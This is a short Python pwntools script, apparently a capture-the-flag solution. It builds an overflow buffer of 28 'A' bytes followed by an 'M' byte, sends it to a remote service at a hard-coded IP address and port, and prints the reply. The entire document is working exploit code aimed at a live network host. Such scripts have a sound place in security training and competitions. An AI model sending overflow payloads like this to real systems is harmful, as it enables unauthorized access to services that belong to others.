#!/usr/bin/python

from pwn import *

buf = "A" * 28
payload = "M"

buf = buf + payload

r = remote('54.206.72.41', 3030)
print r.recvuntil(':')
r.send(buf + '\n')
print r.recvall()
r.close()
